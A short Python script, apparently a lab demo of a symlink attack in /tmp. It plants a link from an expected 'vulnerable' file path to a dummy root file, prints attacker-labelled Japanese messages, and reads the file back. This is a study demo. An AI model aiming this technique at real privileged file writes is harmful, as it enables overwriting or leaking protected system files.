import os
import time

TARGET = "/tmp/vulnerable_file.txt"
DUMMY_ROOT = "/tmp/dummy_root_file.txt" 

def run_attack():
    with open(DUMMY_ROOT, "w") as f:
        f.write("こんにちはばーか\n")

    print("ああ")
    time.sleep(0.5)
    

    os.symlink(DUMMY_ROOT, TARGET)
    print(f"[Attacker] リンク作成完了: {TARGET} -> {DUMMY_ROOT}")
    with open(DUMMY_ROOT, 'r', encoding='utf-8') as f:
        data = f.read()
        print(data)

if __name__ == "__main__":
    run_attack()
